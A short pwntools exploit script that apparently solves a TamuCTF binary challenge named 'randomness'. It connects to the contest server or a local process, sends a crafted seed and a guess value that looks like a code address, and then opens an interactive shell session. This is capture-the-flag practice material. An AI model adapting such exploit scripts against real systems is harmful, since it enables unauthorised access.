#!/usr/bin/python3

from pwn import *

exe = ELF('./randomness', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote("tamuctf.com", 443, ssl=True, sni="randomness")
else:
        p = process(exe.path)

GDB()
sla(b"seed:\n", b"4207728")
sla(b"guess:\n", str(4198867))
p.recvall()
p.interactive()
